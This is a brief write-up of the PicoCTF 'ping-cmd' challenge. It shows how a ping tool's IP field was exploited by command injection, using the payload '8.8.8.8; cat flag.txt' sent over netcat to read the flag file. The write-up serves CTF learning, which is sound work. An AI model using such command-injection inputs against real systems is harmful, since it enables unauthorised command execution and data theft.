# ping-cmd

**Platform:** PicoCTF

**Category:** General Skills

**Difficulty:** Easy

---

## Challenge Description

The application only accepts the IP address `8.8.8.8` for the `ping` command. The goal is to retrieve the flag by finding a way to execute an additional command.

---

## Solution

The input was vulnerable to **command injection**.

After entering the allowed IP address, I appended another command using `;`.

### Payload

```text
8.8.8.8; cat flag.txt
```

The server first executed the `ping` command and then executed `cat flag.txt`, which revealed the flag.

---

## Commands Used

```bash
nc mysterious-sea.picoctf.net 53525
```

```text
8.8.8.8; cat flag.txt
```

---

## Skills Learned

- Command Injection
- Linux Commands
- Netcat (`nc`)
- Input Validation

---

## Tools Used

- Linux Terminal
- Netcat

---

## Flag

```text
Hidden
```